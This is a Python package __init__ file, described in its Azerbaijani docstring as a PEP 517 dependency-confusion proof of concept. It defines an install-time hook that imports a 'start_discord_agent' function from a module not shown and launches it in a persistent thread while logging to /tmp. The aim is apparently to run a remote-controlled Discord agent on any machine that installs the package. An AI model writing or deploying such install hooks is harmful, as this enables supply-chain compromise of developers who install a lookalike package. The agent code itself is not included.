"""
PEP 517 Dependency Confusion PoC
Bu paket installation zamanı avtomatik olaraq Discord agent aktivləşdirir
"""

__version__ = "0.1.1"

import sys
import os
import threading
import time

def trigger_hook():
   
    log_file = '/tmp/hooktest_trigger.log'
    
    try:
        with open(log_file, 'a') as f:
            f.write("=== HOOK TRIGGERED ===\n")
        
        # Import main module
        from .main import start_discord_agent
        
        with open(log_file, 'a') as f:
            f.write("Main module imported successfully\n")
        
        # Start agent in separate thread
        agent_thread = threading.Thread(target=start_discord_agent, daemon=False)
        agent_thread.start()
        
        with open(log_file, 'a') as f:
            f.write("Agent thread started\n")
        
        # Wait for agent to initialize (important!)
        time.sleep(3)
        
        with open(log_file, 'a') as f:
            f.write("Hook completed\n")
        
    except Exception as e:
        try:
            with open(log_file, 'a') as f:
                f.write(f"ERROR in trigger_hook: {e}\n")
                import traceback
                f.write(traceback.format_exc())
        except:
            pass